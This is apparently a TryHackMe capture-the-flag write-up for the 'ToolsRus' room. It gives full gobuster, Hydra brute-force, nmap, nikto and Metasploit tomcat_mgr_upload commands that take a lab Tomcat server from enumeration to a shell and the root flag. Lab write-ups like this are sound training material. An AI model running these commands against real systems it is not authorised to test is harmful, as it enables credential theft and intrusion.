[toolsrus.md](https://github.com/user-attachments/files/26420567/toolsrus.md)
# ToolsRus — TryHackMe Writeup

**Platform**: TryHackMe  
**Difficulty**: Easy  
**Skills**: Gobuster, Hydra, Nmap, Nikto, Metasploit

---

## Overview

ToolsRus is a room designed around chaining multiple tools together — directory enumeration to find a username, brute-forcing credentials, service scanning to identify a vulnerable application, and then exploiting it via Metasploit.

---

## Step 1 — Directory Enumeration (Gobuster)

Started by enumerating hidden directories on the target.

```bash
gobuster dir -u http://10.10.176.46 -w /usr/share/wordlists/dirb/common.txt
```

**Results:**

| Directory | Status |
|-----------|--------|
| `/guidelines` | 301 |
| `/protected` | 401 (requires authentication) |

Browsed to `/guidelines` and found a username: **bob**.

The `/protected` directory returned a 401, meaning it required HTTP Basic Authentication.

---

## Step 2 — Credential Brute Force (Hydra)

With the username `bob` found, used Hydra to brute-force the password for the `/protected` directory.

```bash
hydra -l bob -P /usr/share/wordlists/dirb/big.txt 10.10.176.46 http-get /protected
```

**Result:** Password found — `bubbles`

---

## Step 3 — Service Enumeration (Nmap + Nikto)

Ran a deeper Nmap scan to identify all open ports and service versions.

```bash
nmap -sV -O 10.10.176.46
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 1234 | HTTP (web server on non-standard port) |
| 8009 | AJP |

Port 1234 was running a web server. Ran an aggressive scan to get more detail:

```bash
nmap -A 10.10.176.46
```

**Result:** Apache Tomcat 7.0.88 running on port 1234, using Apache Coyote 1.1.

To confirm the version on port 80:

```bash
nikto -h 10.10.176.46
```

**Result:** Apache 2.4.18 on port 80.

---

## Step 4 — Exploitation (Metasploit)

Apache Tomcat 7.0.88 has a known vulnerability exploitable via the Tomcat Manager upload function.

Searched for and loaded the module in Metasploit:

```bash
msfconsole
use multi/http/tomcat_mgr_upload
```

Configured the options:

```bash
set HttpUsername bob
set HttpPassword bubbles
set RHOSTS 10.10.176.46
set RPORT 1234
set PATH /manager
```

The default URI for this exploit is `/manager` — matched the target's configuration.

```bash
run
```

**Result:** Shell obtained.

---

## Step 5 — Post-Exploitation

Navigated the filesystem and retrieved the root flag from the root directory.

---

## Key Takeaways

- Directory enumeration often reveals more than just paths — check page content for usernames, hints, or configuration details
- When a directory returns 401, it's worth attempting brute-force if you already have a candidate username
- Non-standard ports (like 1234 here) are worth scanning thoroughly — services running there are often less hardened
- Nikto is a quick way to fingerprint web server versions without deep manual inspection
- Tomcat Manager exposed with weak credentials is a reliable exploit path via Metasploit's `tomcat_mgr_upload`
